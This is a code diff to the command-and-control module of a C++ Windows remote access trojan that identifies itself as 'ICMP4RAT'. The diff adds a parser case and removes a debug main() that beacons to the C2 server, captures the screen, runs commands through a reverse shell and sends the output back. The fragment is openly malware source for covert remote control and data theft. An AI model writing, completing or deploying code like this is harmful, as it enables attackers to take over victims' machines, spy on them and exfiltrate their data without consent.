@@ -5,7 +5,6 @@
 #include <ole2.h>
 #include <olectl.h>
 #include "cncManager.h"
-#include "commandManager.h"
 
 cncManager::cncManager() {
 	this->hSession = WinHttpOpen(L"ICMP4RAT", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
@@ -164,6 +163,10 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
                 std::cout << "ftpReqeust !!!" << std::endl;
                 break;
 
+            case none:
+                std::cout << "none !!!" << std::endl;
+                break;
+
             default:
                 std::cout << "Invalid type !!!" << std::endl;
                 break;
@@ -173,21 +176,4 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
         }
     }
 
-}
-
-/* For DEBUG */
-int main() {
-    commandManager cmd;
-	cncManager client;
-    client.sendBeacon();
-
-    cmd.getScreen("abcd.bmp");
-    while (TRUE) {
-        std::string str;
-        std::cout << "Insert key : ";
-        std::getline(std::cin,str);
-        str =  cmd.reverseShell(str.c_str());
-        std::cout << str << std::endl;
-        client.sendData(shellResponse, str.size(), (LPVOID)str.c_str());
-    }
 }
